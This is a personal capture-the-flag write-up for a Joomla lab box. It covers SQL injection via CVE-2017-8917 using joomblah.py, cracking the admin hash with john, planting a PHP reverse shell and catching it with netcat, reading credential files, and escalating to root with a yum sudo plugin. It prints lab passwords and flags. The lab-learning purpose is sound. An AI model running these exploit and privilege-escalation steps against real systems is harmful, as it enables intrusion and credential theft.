## IP Address: 10.10.188.80

[[CTF Notes]]
---

### 🧪 Port Scanning (Nmap)
- **22/tcp** – SSH  
- **80/tcp** – HTTP (Joomla)  
- **3306/tcp** – MySQL  

---

### 🔍 Recon

- The site is running **Joomla 3.7.0**
- Vulnerable to **SQL Injection (CVE-2017-8917)** on the login form:
  - Exploited via GET param: `list[fullordering]`

---

### 🐍 SQLi Exploit (Python)

- Found and used **joomblah.py** from GitHub:

```bash
python3 joomblah.py http://<ip>
```
##### Output:
```
 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$...', '', '']
  -  Extracting sessions from fb9j5_session
```

---

### Cracking the Hash

- Save the hash to `hash.txt`, then run:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

- **Username:** `jonah`
- **Password:** `spiderman123`

---
### 🔐 Joomla Admin Access

- Log in at: `http://10.10.188.80/administrator`

- Upload a **PHP reverse shell** via the media manager or template editor

- Make sure to update php reverse shell to you ip address
---

### 🐚 Shell Access

- Setup `nc` listener to catch the reverse php shell

```
nc -nlvp 1234
```

- After shell access, read the Joomla config:

```bash
cat /var/www/html/configuration.php
```

- DB password: `nv5uz9r3ZEDzVjNu`

- Check users:

```bash
cat /etc/passwd
# Found local user: jjameson
```

---

### SSH as jjameson

- Use the DB creds to pivot or directly SSH if password reuse

- Once in:

```bash
cat user.txt
# 27a260fe3cba712cfdedb1c86d80442e
```

### 🔼 Privilege Escalation

- Check sudo permissions:

```bash
sudo -l
```

- `yum` is available via sudo → use GTFOBins technique:

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

- Catch reverse shell and access **root**!
---

### Root Flag

```bash
cd /root
cat root.txt
```


